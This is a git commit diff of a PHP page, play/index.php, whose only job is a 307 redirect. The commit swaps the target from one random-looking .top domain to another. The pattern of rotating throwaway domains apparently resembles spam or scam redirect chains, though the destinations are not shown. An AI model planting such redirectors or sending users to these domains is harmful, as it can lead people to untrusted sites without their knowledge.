2db3ab6bc7ab474b7f4adf3603b607b69d905b32
PhoenixFan86 <johndoe@example.comphoenixfan86@gmail.com>
2026-01-27 15:53:43 +0200

    new content

--- play/index.php
+++ play/index.php
@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversolivent.top/G8sPVN');
+header('Location: https://serversolirax.top/sQHdhb');
 exit();
 ?>
